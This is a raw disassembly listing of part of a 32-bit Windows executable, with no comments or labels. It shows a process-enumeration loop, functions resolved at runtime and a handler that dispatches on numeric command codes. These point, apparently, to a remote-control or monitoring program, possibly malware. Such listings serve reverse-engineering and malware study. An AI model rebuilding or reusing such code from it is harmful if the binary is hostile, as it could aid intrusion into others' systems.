  4055e2:	e8 a6 09 00 00       	call   0x405f8d
  4055e7:	83 c4 20             	add    $0x20,%esp
  4055ea:	68 b8 0b 00 00       	push   $0xbb8
  4055ef:	ff 15 94 d1 40 00    	call   *0x40d194
  4055f5:	e9 4b ff ff ff       	jmp    0x405545
  4055fa:	6a 01                	push   $0x1
  4055fc:	8d 45 fd             	lea    -0x3(%ebp),%eax
  4055ff:	83 ec 10             	sub    $0x10,%esp
  405602:	8b cc                	mov    %esp,%ecx
  405604:	50                   	push   %eax
  405605:	68 ec 17 41 00       	push   $0x4117ec
  40560a:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  405610:	68 04 dc 40 00       	push   $0x40dc04
  405615:	8d 45 d8             	lea    -0x28(%ebp),%eax
  405618:	68 c8 17 41 00       	push   $0x4117c8
  40561d:	50                   	push   %eax
  40561e:	e8 eb 5b 00 00       	call   0x40b20e
  405623:	59                   	pop    %ecx
  405624:	59                   	pop    %ecx
  405625:	8b c8                	mov    %eax,%ecx
  405627:	ff 15 98 d2 40 00    	call   *0x40d298
  40562d:	50                   	push   %eax
  40562e:	56                   	push   %esi
  40562f:	e8 0a 0a 00 00       	call   0x40603e
  405634:	83 c4 20             	add    $0x20,%esp
  405637:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40563a:	ff 15 9c d2 40 00    	call   *0x40d29c
  405640:	6a 01                	push   $0x1
  405642:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405645:	83 ec 10             	sub    $0x10,%esp
  405648:	8b cc                	mov    %esp,%ecx
  40564a:	50                   	push   %eax
  40564b:	68 f8 db 40 00       	push   $0x40dbf8
  405650:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  405656:	53                   	push   %ebx
  405657:	8b cf                	mov    %edi,%ecx
  405659:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  40565f:	50                   	push   %eax
  405660:	56                   	push   %esi
  405661:	e8 27 09 00 00       	call   0x405f8d
  405666:	83 c4 20             	add    $0x20,%esp
  405669:	6a 00                	push   $0x0
  40566b:	ff 15 48 d3 40 00    	call   *0x40d348
  405671:	55                   	push   %ebp
  405672:	8b ec                	mov    %esp,%ebp
  405674:	51                   	push   %ecx
  405675:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405678:	6a 03                	push   $0x3
  40567a:	50                   	push   %eax
  40567b:	6a 5a                	push   $0x5a
  40567d:	68 00 08 00 00       	push   $0x800
  405682:	ff 15 ac d0 40 00    	call   *0x40d0ac
  405688:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40568b:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40568e:	50                   	push   %eax
  40568f:	8d 45 fc             	lea    -0x4(%ebp),%eax
  405692:	50                   	push   %eax
  405693:	ff 15 a4 d2 40 00    	call   *0x40d2a4
  405699:	8b 45 08             	mov    0x8(%ebp),%eax
  40569c:	c9                   	leave
  40569d:	c3                   	ret
  40569e:	55                   	push   %ebp
  40569f:	8b ec                	mov    %esp,%ebp
  4056a1:	81 ec 20 03 00 00    	sub    $0x320,%esp
  4056a7:	8d 45 ff             	lea    -0x1(%ebp),%eax
  4056aa:	57                   	push   %edi
  4056ab:	50                   	push   %eax
  4056ac:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4056af:	ff 15 dc d2 40 00    	call   *0x40d2dc
  4056b5:	e8 33 5e 00 00       	call   0x40b4ed
  4056ba:	6a 00                	push   $0x0
  4056bc:	6a 02                	push   $0x2
  4056be:	a2 5c 1d 41 00       	mov    %al,0x411d5c
  4056c3:	e8 be 6c 00 00       	call   0x40c386
  4056c8:	8b f8                	mov    %eax,%edi
  4056ca:	85 ff                	test   %edi,%edi
  4056cc:	0f 84 e7 01 00 00    	je     0x4058b9
  4056d2:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4056d8:	c7 85 e0 fc ff ff 2c 	movl   $0x22c,-0x320(%ebp)
  4056df:	02 00 00 
  4056e2:	50                   	push   %eax
  4056e3:	57                   	push   %edi
  4056e4:	e8 97 6c 00 00       	call   0x40c380
  4056e9:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4056ef:	50                   	push   %eax
  4056f0:	57                   	push   %edi
  4056f1:	e8 84 6c 00 00       	call   0x40c37a
  4056f6:	85 c0                	test   %eax,%eax
  4056f8:	0f 84 b4 01 00 00    	je     0x4058b2
  4056fe:	56                   	push   %esi
  4056ff:	be 2c dc 40 00       	mov    $0x40dc2c,%esi
  405704:	8d 45 ff             	lea    -0x1(%ebp),%eax
  405707:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40570a:	50                   	push   %eax
  40570b:	8d 85 04 fd ff ff    	lea    -0x2fc(%ebp),%eax
  405711:	50                   	push   %eax
  405712:	ff 15 a0 d2 40 00    	call   *0x40d2a0
  405718:	68 28 dc 40 00       	push   $0x40dc28
  40571d:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  405723:	e8 ef 5d 00 00       	call   0x40b517
  405728:	0f b6 c0             	movzbl %al,%eax
  40572b:	50                   	push   %eax
  40572c:	8d 85 1c ff ff ff    	lea    -0xe4(%ebp),%eax
  405732:	50                   	push   %eax
  405733:	e8 59 5a 00 00       	call   0x40b191
  405738:	83 c4 0c             	add    $0xc,%esp
  40573b:	50                   	push   %eax
  40573c:	56                   	push   %esi
  40573d:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  405743:	8d 85 3c ff ff ff    	lea    -0xc4(%ebp),%eax
  405749:	50                   	push   %eax
  40574a:	e8 42 5a 00 00       	call   0x40b191
  40574f:	59                   	pop    %ecx
  405750:	59                   	pop    %ecx
  405751:	50                   	push   %eax
  405752:	56                   	push   %esi
  405753:	ff b5 e8 fc ff ff    	push   -0x318(%ebp)
  405759:	8d 85 5c ff ff ff    	lea    -0xa4(%ebp),%eax
  40575f:	50                   	push   %eax
  405760:	e8 e7 5d 00 00       	call   0x40b54c
  405765:	50                   	push   %eax
  405766:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40576c:	50                   	push   %eax
  40576d:	e8 5c 5b 00 00       	call   0x40b2ce
  405772:	83 c4 10             	add    $0x10,%esp
  405775:	50                   	push   %eax
  405776:	8d 45 dc             	lea    -0x24(%ebp),%eax
  405779:	56                   	push   %esi
  40577a:	50                   	push   %eax
  40577b:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40577e:	50                   	push   %eax
  40577f:	e8 4a 5b 00 00       	call   0x40b2ce
  405784:	50                   	push   %eax
  405785:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405788:	50                   	push   %eax
  405789:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40578c:	50                   	push   %eax
  40578d:	e8 26 6f 00 00       	call   0x40c6b8
  405792:	83 c4 14             	add    $0x14,%esp
  405795:	50                   	push   %eax
  405796:	8d 85 2c ff ff ff    	lea    -0xd4(%ebp),%eax
  40579c:	50                   	push   %eax
  40579d:	e8 fe 6e 00 00       	call   0x40c6a0
  4057a2:	83 c4 0c             	add    $0xc,%esp
  4057a5:	50                   	push   %eax
  4057a6:	8d 45 cc             	lea    -0x34(%ebp),%eax
  4057a9:	50                   	push   %eax
  4057aa:	e8 09 6f 00 00       	call   0x40c6b8
  4057af:	83 c4 0c             	add    $0xc,%esp
  4057b2:	50                   	push   %eax
  4057b3:	8d 85 0c ff ff ff    	lea    -0xf4(%ebp),%eax
  4057b9:	50                   	push   %eax
  4057ba:	e8 e1 6e 00 00       	call   0x40c6a0
  4057bf:	83 c4 0c             	add    $0xc,%esp
  4057c2:	50                   	push   %eax
  4057c3:	8d 45 8c             	lea    -0x74(%ebp),%eax
  4057c6:	50                   	push   %eax
  4057c7:	e8 ec 6e 00 00       	call   0x40c6b8
  4057cc:	83 c4 0c             	add    $0xc,%esp
  4057cf:	50                   	push   %eax
  4057d0:	8d 85 4c ff ff ff    	lea    -0xb4(%ebp),%eax
  4057d6:	50                   	push   %eax
  4057d7:	e8 c4 6e 00 00       	call   0x40c6a0
  4057dc:	83 c4 0c             	add    $0xc,%esp
  4057df:	50                   	push   %eax
  4057e0:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4057e3:	50                   	push   %eax
  4057e4:	e8 cf 6e 00 00       	call   0x40c6b8
  4057e9:	83 c4 0c             	add    $0xc,%esp
  4057ec:	50                   	push   %eax
  4057ed:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  4057f3:	50                   	push   %eax
  4057f4:	e8 a7 6e 00 00       	call   0x40c6a0
  4057f9:	83 c4 0c             	add    $0xc,%esp
  4057fc:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4057ff:	50                   	push   %eax
  405800:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  405806:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40580c:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405812:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  405815:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40581b:	8d 8d 4c ff ff ff    	lea    -0xb4(%ebp),%ecx
  405821:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405827:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40582a:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405830:	8d 8d 0c ff ff ff    	lea    -0xf4(%ebp),%ecx
  405836:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40583c:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40583f:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405845:	8d 8d 2c ff ff ff    	lea    -0xd4(%ebp),%ecx
  40584b:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405851:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  405854:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40585a:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40585d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405863:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  405869:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  40586f:	8d 8d 5c ff ff ff    	lea    -0xa4(%ebp),%ecx
  405875:	ff 15 9c d2 40 00    	call   *0x40d29c
  40587b:	8d 8d 3c ff ff ff    	lea    -0xc4(%ebp),%ecx
  405881:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405887:	8d 8d 1c ff ff ff    	lea    -0xe4(%ebp),%ecx
  40588d:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405893:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  405896:	ff 15 9c d2 40 00    	call   *0x40d29c
  40589c:	8d 85 e0 fc ff ff    	lea    -0x320(%ebp),%eax
  4058a2:	50                   	push   %eax
  4058a3:	57                   	push   %edi
  4058a4:	e8 d1 6a 00 00       	call   0x40c37a
  4058a9:	85 c0                	test   %eax,%eax
  4058ab:	0f 85 53 fe ff ff    	jne    0x405704
  4058b1:	5e                   	pop    %esi
  4058b2:	57                   	push   %edi
  4058b3:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  4058b9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4058bc:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4058bf:	50                   	push   %eax
  4058c0:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  4058c6:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  4058c9:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  4058cf:	8b 45 08             	mov    0x8(%ebp),%eax
  4058d2:	5f                   	pop    %edi
  4058d3:	c9                   	leave
  4058d4:	c3                   	ret
  4058d5:	55                   	push   %ebp
  4058d6:	8b ec                	mov    %esp,%ebp
  4058d8:	53                   	push   %ebx
  4058d9:	56                   	push   %esi
  4058da:	57                   	push   %edi
  4058db:	8b 7d 08             	mov    0x8(%ebp),%edi
  4058de:	8b f1                	mov    %ecx,%esi
  4058e0:	3b f7                	cmp    %edi,%esi
  4058e2:	0f 84 f4 00 00 00    	je     0x4059dc
  4058e8:	8b cf                	mov    %edi,%ecx
  4058ea:	e8 a0 c2 ff ff       	call   0x401b8f
  4058ef:	8b ce                	mov    %esi,%ecx
  4058f1:	8b d8                	mov    %eax,%ebx
  4058f3:	e8 97 c2 ff ff       	call   0x401b8f
  4058f8:	3b d8                	cmp    %eax,%ebx
  4058fa:	77 3b                	ja     0x405937
  4058fc:	ff 76 04             	push   0x4(%esi)
  4058ff:	8b cf                	mov    %edi,%ecx
  405901:	e8 94 64 00 00       	call   0x40bd9a
  405906:	50                   	push   %eax
  405907:	8b cf                	mov    %edi,%ecx
  405909:	e8 7d c2 ff ff       	call   0x401b8b
  40590e:	50                   	push   %eax
  40590f:	e8 37 01 00 00       	call   0x405a4b
  405914:	83 c4 0c             	add    $0xc,%esp
  405917:	8b ce                	mov    %esi,%ecx
  405919:	ff 76 08             	push   0x8(%esi)
  40591c:	50                   	push   %eax
  40591d:	e8 80 c2 ff ff       	call   0x401ba2
  405922:	8b cf                	mov    %edi,%ecx
  405924:	e8 66 c2 ff ff       	call   0x401b8f
  405929:	c1 e0 04             	shl    $0x4,%eax
  40592c:	03 46 04             	add    0x4(%esi),%eax
  40592f:	89 46 08             	mov    %eax,0x8(%esi)
  405932:	e9 a5 00 00 00       	jmp    0x4059dc
  405937:	8b cf                	mov    %edi,%ecx
  405939:	e8 51 c2 ff ff       	call   0x401b8f
  40593e:	8b ce                	mov    %esi,%ecx
  405940:	8b d8                	mov    %eax,%ebx
  405942:	e8 9e 00 00 00       	call   0x4059e5
  405947:	3b d8                	cmp    %eax,%ebx
  405949:	77 3e                	ja     0x405989
  40594b:	8b ce                	mov    %esi,%ecx
  40594d:	e8 3d c2 ff ff       	call   0x401b8f
  405952:	8b d8                	mov    %eax,%ebx
  405954:	8b cf                	mov    %edi,%ecx
  405956:	c1 e3 04             	shl    $0x4,%ebx
  405959:	e8 2d c2 ff ff       	call   0x401b8b
  40595e:	ff 76 04             	push   0x4(%esi)
  405961:	03 d8                	add    %eax,%ebx
  405963:	8b cf                	mov    %edi,%ecx
  405965:	53                   	push   %ebx
  405966:	e8 20 c2 ff ff       	call   0x401b8b
  40596b:	50                   	push   %eax
  40596c:	e8 da 00 00 00       	call   0x405a4b
  405971:	83 c4 0c             	add    $0xc,%esp
  405974:	8b cf                	mov    %edi,%ecx
  405976:	ff 76 08             	push   0x8(%esi)
  405979:	e8 1c 64 00 00       	call   0x40bd9a
  40597e:	50                   	push   %eax
  40597f:	53                   	push   %ebx
  405980:	8b ce                	mov    %esi,%ecx
  405982:	e8 71 00 00 00       	call   0x4059f8
  405987:	eb 99                	jmp    0x405922
  405989:	ff 76 08             	push   0x8(%esi)
  40598c:	8b ce                	mov    %esi,%ecx
  40598e:	ff 76 04             	push   0x4(%esi)
  405991:	e8 0c c2 ff ff       	call   0x401ba2
  405996:	8b 46 04             	mov    0x4(%esi),%eax
  405999:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40599c:	2b c8                	sub    %eax,%ecx
  40599e:	c1 f9 04             	sar    $0x4,%ecx
  4059a1:	51                   	push   %ecx
  4059a2:	50                   	push   %eax
  4059a3:	8b ce                	mov    %esi,%ecx
  4059a5:	e8 d8 e3 ff ff       	call   0x403d82
  4059aa:	6a 00                	push   $0x0
  4059ac:	8b cf                	mov    %edi,%ecx
  4059ae:	e8 dc c1 ff ff       	call   0x401b8f
  4059b3:	50                   	push   %eax
  4059b4:	8b ce                	mov    %esi,%ecx
  4059b6:	e8 69 00 00 00       	call   0x405a24
  4059bb:	50                   	push   %eax
  4059bc:	8b cf                	mov    %edi,%ecx
  4059be:	89 46 04             	mov    %eax,0x4(%esi)
  4059c1:	e8 d4 63 00 00       	call   0x40bd9a
  4059c6:	50                   	push   %eax
  4059c7:	8b cf                	mov    %edi,%ecx
  4059c9:	e8 bd c1 ff ff       	call   0x401b8b
  4059ce:	50                   	push   %eax
  4059cf:	8b ce                	mov    %esi,%ecx
  4059d1:	e8 22 00 00 00       	call   0x4059f8
  4059d6:	89 46 08             	mov    %eax,0x8(%esi)
  4059d9:	89 46 0c             	mov    %eax,0xc(%esi)
  4059dc:	8b c6                	mov    %esi,%eax
  4059de:	5f                   	pop    %edi
  4059df:	5e                   	pop    %esi
  4059e0:	5b                   	pop    %ebx
  4059e1:	5d                   	pop    %ebp
  4059e2:	c2 04 00             	ret    $0x4
  4059e5:	8b 51 04             	mov    0x4(%ecx),%edx
  4059e8:	85 d2                	test   %edx,%edx
  4059ea:	75 03                	jne    0x4059ef
  4059ec:	33 c0                	xor    %eax,%eax
  4059ee:	c3                   	ret
  4059ef:	8b 41 0c             	mov    0xc(%ecx),%eax
  4059f2:	2b c2                	sub    %edx,%eax
  4059f4:	c1 f8 04             	sar    $0x4,%eax
  4059f7:	c3                   	ret
  4059f8:	55                   	push   %ebp
  4059f9:	8b ec                	mov    %esp,%ebp
  4059fb:	56                   	push   %esi
  4059fc:	8b 75 08             	mov    0x8(%ebp),%esi
  4059ff:	57                   	push   %edi
  405a00:	8b f9                	mov    %ecx,%edi
  405a02:	3b 75 0c             	cmp    0xc(%ebp),%esi
  405a05:	74 14                	je     0x405a1b
  405a07:	56                   	push   %esi
  405a08:	8b cf                	mov    %edi,%ecx
  405a0a:	ff 75 10             	push   0x10(%ebp)
  405a0d:	e8 25 00 00 00       	call   0x405a37
  405a12:	83 45 10 10          	addl   $0x10,0x10(%ebp)
  405a16:	83 c6 10             	add    $0x10,%esi
  405a19:	eb e7                	jmp    0x405a02
  405a1b:	8b 45 10             	mov    0x10(%ebp),%eax
  405a1e:	5f                   	pop    %edi
  405a1f:	5e                   	pop    %esi
  405a20:	5d                   	pop    %ebp
  405a21:	c2 0c 00             	ret    $0xc
  405a24:	55                   	push   %ebp
  405a25:	8b ec                	mov    %esp,%ebp
  405a27:	6a 00                	push   $0x0
  405a29:	ff 75 08             	push   0x8(%ebp)
  405a2c:	e8 3f 00 00 00       	call   0x405a70
  405a31:	59                   	pop    %ecx
  405a32:	59                   	pop    %ecx
  405a33:	5d                   	pop    %ebp
  405a34:	c2 08 00             	ret    $0x8
  405a37:	55                   	push   %ebp
  405a38:	8b ec                	mov    %esp,%ebp
  405a3a:	ff 75 0c             	push   0xc(%ebp)
  405a3d:	ff 75 08             	push   0x8(%ebp)
  405a40:	e8 43 00 00 00       	call   0x405a88
  405a45:	59                   	pop    %ecx
  405a46:	59                   	pop    %ecx
  405a47:	5d                   	pop    %ebp
  405a48:	c2 08 00             	ret    $0x8
  405a4b:	55                   	push   %ebp
  405a4c:	8b ec                	mov    %esp,%ebp
  405a4e:	56                   	push   %esi
  405a4f:	8b 75 08             	mov    0x8(%ebp),%esi
  405a52:	3b 75 0c             	cmp    0xc(%ebp),%esi
  405a55:	74 13                	je     0x405a6a
  405a57:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405a5a:	56                   	push   %esi
  405a5b:	ff 15 d4 d2 40 00    	call   *0x40d2d4
  405a61:	83 45 10 10          	addl   $0x10,0x10(%ebp)
  405a65:	83 c6 10             	add    $0x10,%esi
  405a68:	eb e8                	jmp    0x405a52
  405a6a:	8b 45 10             	mov    0x10(%ebp),%eax
  405a6d:	5e                   	pop    %esi
  405a6e:	5d                   	pop    %ebp
  405a6f:	c3                   	ret
  405a70:	55                   	push   %ebp
  405a71:	8b ec                	mov    %esp,%ebp
  405a73:	8b 45 08             	mov    0x8(%ebp),%eax
  405a76:	85 c0                	test   %eax,%eax
  405a78:	7d 02                	jge    0x405a7c
  405a7a:	33 c0                	xor    %eax,%eax
  405a7c:	c1 e0 04             	shl    $0x4,%eax
  405a7f:	50                   	push   %eax
  405a80:	e8 ab 69 00 00       	call   0x40c430
  405a85:	59                   	pop    %ecx
  405a86:	5d                   	pop    %ebp
  405a87:	c3                   	ret
  405a88:	55                   	push   %ebp
  405a89:	8b ec                	mov    %esp,%ebp
  405a8b:	ff 75 08             	push   0x8(%ebp)
  405a8e:	6a 10                	push   $0x10
  405a90:	e8 13 00 00 00       	call   0x405aa8
  405a95:	59                   	pop    %ecx
  405a96:	85 c0                	test   %eax,%eax
  405a98:	59                   	pop    %ecx
  405a99:	74 0b                	je     0x405aa6
  405a9b:	ff 75 0c             	push   0xc(%ebp)
  405a9e:	8b c8                	mov    %eax,%ecx
  405aa0:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405aa6:	5d                   	pop    %ebp
  405aa7:	c3                   	ret
  405aa8:	55                   	push   %ebp
  405aa9:	8b ec                	mov    %esp,%ebp
  405aab:	8b 45 0c             	mov    0xc(%ebp),%eax
  405aae:	5d                   	pop    %ebp
  405aaf:	c3                   	ret
  405ab0:	e8 05 00 00 00       	call   0x405aba
  405ab5:	e9 0d 00 00 00       	jmp    0x405ac7
  405aba:	6a 00                	push   $0x0
  405abc:	b9 78 1a 41 00       	mov    $0x411a78,%ecx
  405ac1:	e8 b2 b5 ff ff       	call   0x401078
  405ac6:	c3                   	ret
  405ac7:	68 d3 5a 40 00       	push   $0x405ad3
  405acc:	e8 e7 68 00 00       	call   0x40c3b8
  405ad1:	59                   	pop    %ecx
  405ad2:	c3                   	ret
  405ad3:	b9 78 1a 41 00       	mov    $0x411a78,%ecx
  405ad8:	e9 8e b6 ff ff       	jmp    0x40116b
  405add:	55                   	push   %ebp
  405ade:	8b ec                	mov    %esp,%ebp
  405ae0:	53                   	push   %ebx
  405ae1:	bb 78 1a 41 00       	mov    $0x411a78,%ebx
  405ae6:	56                   	push   %esi
  405ae7:	57                   	push   %edi
  405ae8:	8b cb                	mov    %ebx,%ecx
  405aea:	e8 b1 b5 ff ff       	call   0x4010a0
  405aef:	83 ec 10             	sub    $0x10,%esp
  405af2:	be 78 11 41 00       	mov    $0x411178,%esi
  405af7:	8b fc                	mov    %esp,%edi
  405af9:	8b cb                	mov    %ebx,%ecx
  405afb:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405afc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405afd:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405afe:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405aff:	e8 ff b5 ff ff       	call   0x401103
  405b04:	80 3d bc 1a 41 00 00 	cmpb   $0x0,0x411abc
  405b0b:	74 13                	je     0x405b20
  405b0d:	83 ec 10             	sub    $0x10,%esp
  405b10:	8d 45 08             	lea    0x8(%ebp),%eax
  405b13:	8b cc                	mov    %esp,%ecx
  405b15:	50                   	push   %eax
  405b16:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405b1c:	6a 76                	push   $0x76
  405b1e:	eb 11                	jmp    0x405b31
  405b20:	83 ec 10             	sub    $0x10,%esp
  405b23:	8d 45 08             	lea    0x8(%ebp),%eax
  405b26:	8b cc                	mov    %esp,%ecx
  405b28:	50                   	push   %eax
  405b29:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405b2f:	6a 75                	push   $0x75
  405b31:	8b cb                	mov    %ebx,%ecx
  405b33:	e8 f2 b5 ff ff       	call   0x40112a
  405b38:	6a 01                	push   $0x1
  405b3a:	68 54 5b 40 00       	push   $0x405b54
  405b3f:	8b cb                	mov    %ebx,%ecx
  405b41:	e8 6b b6 ff ff       	call   0x4011b1
  405b46:	8d 4d 08             	lea    0x8(%ebp),%ecx
  405b49:	ff 15 d8 d2 40 00    	call   *0x40d2d8
  405b4f:	5f                   	pop    %edi
  405b50:	5e                   	pop    %esi
  405b51:	5b                   	pop    %ebx
  405b52:	5d                   	pop    %ebp
  405b53:	c3                   	ret
  405b54:	55                   	push   %ebp
  405b55:	8b ec                	mov    %esp,%ebp
  405b57:	83 ec 50             	sub    $0x50,%esp
  405b5a:	53                   	push   %ebx
  405b5b:	8b 5d 08             	mov    0x8(%ebp),%ebx
  405b5e:	56                   	push   %esi
  405b5f:	57                   	push   %edi
  405b60:	8d 43 18             	lea    0x18(%ebx),%eax
  405b63:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405b66:	50                   	push   %eax
  405b67:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405b6d:	ff 73 28             	push   0x28(%ebx)
  405b70:	ff 15 88 d1 40 00    	call   *0x40d188
  405b76:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405b79:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  405b7f:	8b 30                	mov    (%eax),%esi
  405b81:	a1 c8 d2 40 00       	mov    0x40d2c8,%eax
  405b86:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  405b89:	ff 30                	push   (%eax)
  405b8b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405b8e:	6a 04                	push   $0x4
  405b90:	50                   	push   %eax
  405b91:	ff 15 cc d2 40 00    	call   *0x40d2cc
  405b97:	83 ec 10             	sub    $0x10,%esp
  405b9a:	bf 68 11 41 00       	mov    $0x411168,%edi
  405b9f:	8b cc                	mov    %esp,%ecx
  405ba1:	57                   	push   %edi
  405ba2:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405ba8:	83 ec 10             	sub    $0x10,%esp
  405bab:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405bae:	8b cc                	mov    %esp,%ecx
  405bb0:	50                   	push   %eax
  405bb1:	ff 15 e0 d2 40 00    	call   *0x40d2e0
  405bb7:	8d 45 f0             	lea    -0x10(%ebp),%eax
  405bba:	50                   	push   %eax
  405bbb:	e8 2d 58 00 00       	call   0x40b3ed
  405bc0:	83 c4 24             	add    $0x24,%esp
  405bc3:	83 ee 46             	sub    $0x46,%esi
  405bc6:	0f 84 82 00 00 00    	je     0x405c4e
  405bcc:	4e                   	dec    %esi
  405bcd:	74 23                	je     0x405bf2
  405bcf:	4e                   	dec    %esi
  405bd0:	4e                   	dec    %esi
  405bd1:	0f 85 c6 01 00 00    	jne    0x405d9d
  405bd7:	ff 15 c8 1a 41 00    	call   *0x411ac8
  405bdd:	83 ec 10             	sub    $0x10,%esp
  405be0:	8b cc                	mov    %esp,%ecx
  405be2:	50                   	push   %eax
  405be3:	51                   	push   %ecx
  405be4:	e8 a8 55 00 00       	call   0x40b191
  405be9:	59                   	pop    %ecx
  405bea:	59                   	pop    %ecx
  405beb:	6a 77                	push   $0x77
  405bed:	e9 17 01 00 00       	jmp    0x405d09
  405bf2:	33 f6                	xor    %esi,%esi
  405bf4:	68 84 dc 40 00       	push   $0x40dc84
  405bf9:	56                   	push   %esi
  405bfa:	56                   	push   %esi
  405bfb:	56                   	push   %esi
  405bfc:	ff 15 9c d1 40 00    	call   *0x40d19c
  405c02:	56                   	push   %esi
  405c03:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405c06:	8b f8                	mov    %eax,%edi
  405c08:	e8 52 bf ff ff       	call   0x401b5f
  405c0d:	8b c8                	mov    %eax,%ecx
  405c0f:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  405c15:	50                   	push   %eax
  405c16:	ff 15 58 d3 40 00    	call   *0x40d358
  405c1c:	50                   	push   %eax
  405c1d:	ff 15 c0 1a 41 00    	call   *0x411ac0
  405c23:	51                   	push   %ecx
  405c24:	51                   	push   %ecx
  405c25:	8b cc                	mov    %esp,%ecx
  405c27:	50                   	push   %eax
  405c28:	51                   	push   %ecx
  405c29:	e8 63 55 00 00       	call   0x40b191
  405c2e:	59                   	pop    %ecx
  405c2f:	59                   	pop    %ecx
  405c30:	6a 77                	push   $0x77
  405c32:	8b cb                	mov    %ebx,%ecx
  405c34:	e8 f1 b4 ff ff       	call   0x40112a
  405c39:	6a ff                	push   $0xffffffff
  405c3b:	57                   	push   %edi
  405c3c:	ff 15 a0 d1 40 00    	call   *0x40d1a0
  405c42:	57                   	push   %edi
  405c43:	ff 15 a4 d1 40 00    	call   *0x40d1a4
  405c49:	e9 4f 01 00 00       	jmp    0x405d9d
  405c4e:	6a 01                	push   $0x1
  405c50:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  405c53:	e8 07 bf ff ff       	call   0x401b5f
  405c58:	8b c8                	mov    %eax,%ecx
  405c5a:	ff 15 c0 d2 40 00    	call   *0x40d2c0
  405c60:	50                   	push   %eax
  405c61:	e8 eb e1 ff ff       	call   0x403e51
  405c66:	33 f6                	xor    %esi,%esi
  405c68:	59                   	pop    %ecx
  405c69:	3b c6                	cmp    %esi,%eax
  405c6b:	89 45 08             	mov    %eax,0x8(%ebp)
  405c6e:	0f 84 e3 00 00 00    	je     0x405d57
  405c74:	68 74 dc 40 00       	push   $0x40dc74
  405c79:	50                   	push   %eax
  405c7a:	e8 2c e4 ff ff       	call   0x4040ab
  405c7f:	68 64 dc 40 00       	push   $0x40dc64
  405c84:	a3 c0 1a 41 00       	mov    %eax,0x411ac0
  405c89:	ff 75 08             	push   0x8(%ebp)
  405c8c:	e8 1a e4 ff ff       	call   0x4040ab
  405c91:	68 58 dc 40 00       	push   $0x40dc58
  405c96:	a3 c4 1a 41 00       	mov    %eax,0x411ac4
  405c9b:	ff 75 08             	push   0x8(%ebp)
  405c9e:	e8 08 e4 ff ff       	call   0x4040ab
  405ca3:	68 4c dc 40 00       	push   $0x40dc4c
  405ca8:	a3 c8 1a 41 00       	mov    %eax,0x411ac8
  405cad:	ff 75 08             	push   0x8(%ebp)
  405cb0:	e8 f6 e3 ff ff       	call   0x4040ab
  405cb5:	68 34 dc 40 00       	push   $0x40dc34
  405cba:	a3 cc 1a 41 00       	mov    %eax,0x411acc
  405cbf:	ff 75 08             	push   0x8(%ebp)
  405cc2:	e8 e4 e3 ff ff       	call   0x4040ab
  405cc7:	83 c4 28             	add    $0x28,%esp
  405cca:	39 35 c0 1a 41 00    	cmp    %esi,0x411ac0
  405cd0:	a3 d0 1a 41 00       	mov    %eax,0x411ad0
  405cd5:	74 3e                	je     0x405d15
